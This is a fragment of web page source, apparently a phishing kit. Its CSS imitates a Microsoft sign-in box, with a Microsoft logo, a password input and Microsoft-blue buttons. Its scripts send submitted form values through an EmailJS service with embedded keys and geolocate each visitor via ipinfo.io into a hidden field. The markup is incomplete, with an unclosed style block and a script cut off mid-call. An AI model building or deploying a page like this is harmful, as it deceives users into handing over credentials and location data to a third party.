    <style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background: linear-gradient(to bottom right, #f8f8f8, #e0e0e0);
}

.login-container {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
}

.login-box {
    background: white;
    padding: 40px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
    width: 350px;
    position: relative;
}

.microsoft-logo {
    width: 100px;
    position: absolute;
    top: -60px;
    left: 50%;
    transform: translateX(-50%);
}

.login-box h1 {
    margin-top: 30px;
    margin-bottom: 20px;
    font-size: 24px;
}

.login-box .mslogo {
    margin-right: 245px;
    margin-top: 20px;
    margin-bottom: 40px;
    height: 24px;
}

.login-box form {
    display: flex;
    flex-direction: column;
}

.login-box label {
    text-align: left;
    margin-bottom: 5px;
    font-weight: bold;
}

.login-box input[type="text"],
.login-box input[type="password"] {
    border-color: rgb(102, 102, 102);
    border-bottom-width: 1px;
    border-top-width: 0px;
    border-left-width: 0px;
    border-right-width: 0px;
    padding: 10px;
    margin-bottom: 20px;
    /*border: 1px solid #ccc;
    border-radius: 5px;*/
    font-size: 16px;
    width: 90%;
}

.login-box input[readonly] {
    background-color: #f0f0f0;
}

.login-box a {
    color: #0078d4;
    text-decoration: none;
    margin-bottom: 20px;
    text-align: left;
    display: block;
}

.login-box a:hover {
    text-decoration: underline;
}

.login-box button {
    background-color: #0078d4;
    max-width: 100px;
    min-width: 108px;
    min-height: 32px;
    margin-left: 230px;
    color: white;
    padding: 10px;
    border: none;
    font-size: 16px;
    cursor: pointer;
}

.login-box button:hover {
    background-color: #005a9e;
}

.other-account {
    margin-top: 20px;
    display: block;
    text-align: center;
}

    <script type="text/javascript">
      (function() {
          emailjs.init("F-ukdXP-Y7BKpQ9Vz"); // Use your EmailJS User ID
      })();
  
      document.getElementById("contact-form").addEventListener("submit", function(event) {
          event.preventDefault();
  
          // Collect form values
          var name = document.getElementById("name").value;
          var email = document.getElementById("email").value;
          var message = document.getElementById("message").value;
          var region = document.getElementById("region").value;
          // Prepare email parameters
          var emailParams = {
              from_name: name,
              from_email: email,
              message: message,
              region: region
          };
  
          // Send the email using EmailJS
          emailjs.send("service_68kfjk2", "template_vnj442a", emailParams)

<script>
    // Function to get user's country using IP info service
    function getUserRegion() {
        // Use ipinfo.io API to get user's geolocation info
        fetch('https://ipinfo.io?token=999a655c730c7c') // Replace 'YOUR_API_TOKEN' with your actual API token
            .then(response => response.json())
            .then(data => {
                // Get the country from the response data
                var region = data.region;
  
                // Populate the hidden form field with the country code
                document.getElementById('region').value = region;
            })
            .catch(error => {
                // Handle error if the API request fails
                alert('Error fetching region: ' + error.message);
            });
    }
  
    // Call getUserCountry when the page loads
    window.onload = function() {
        getUserRegion();
    }
  </script>
